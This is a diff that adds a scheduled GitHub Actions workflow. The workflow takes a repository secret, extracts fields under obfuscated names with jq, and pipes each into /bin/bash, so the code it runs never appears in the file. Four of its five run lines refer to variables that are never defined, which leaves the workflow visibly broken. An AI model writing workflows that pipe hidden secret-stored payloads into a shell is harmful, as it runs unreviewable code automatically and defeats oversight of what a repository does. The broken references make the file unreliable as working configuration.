@@ -1,0 +1,21 @@
+name: fangzhangdx
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '18 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: fangzhangdx
+        env:
+          c645: ${{ secrets.c645 }}
+        run: |
+          echo $c645 | jq -r .tk1939 | /bin/bash
+          echo $bbk1809 | jq -r .fg60 | /bin/bash
+          echo $nw76 | jq -r .xepps0958 | /bin/bash
+          echo $lul79 | jq -r .wxmkr71656 | /bin/bash
+          echo $vhu9 | jq -r .gddeh4177 | /bin/bash
+
